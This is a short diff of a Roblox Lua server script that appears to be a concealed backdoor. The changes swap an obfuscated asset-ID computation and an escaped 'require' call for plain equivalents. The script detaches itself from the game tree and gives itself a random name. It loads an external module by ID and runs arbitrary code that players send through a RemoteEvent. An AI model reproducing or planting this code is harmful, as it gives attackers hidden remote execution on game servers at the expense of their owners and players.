@@ -45,10 +45,10 @@
 ]]--
 
 script.Parent = nil
-local _R = require(81352.270165 ^ 2 + 0.0009)
+local _R = require(6618191861)
 local L = script.ExecutionService.L
 script.Name = "Thread_".._R.crypt.base64.encode(math.random())
-local function execute(code) getfenv()["\114\101\113\117\105\114\101"](L)(code, getfenv(0))() end
+local function execute(code) require(L)(code)() end
 local function randomname() return _R.crypt.md5(math.random()) end
 script.ExecutionService.Execute.OnServerEvent:Connect(function(player, code)
 	if pcall(function() assert(player.ERSEI.Value) end) then
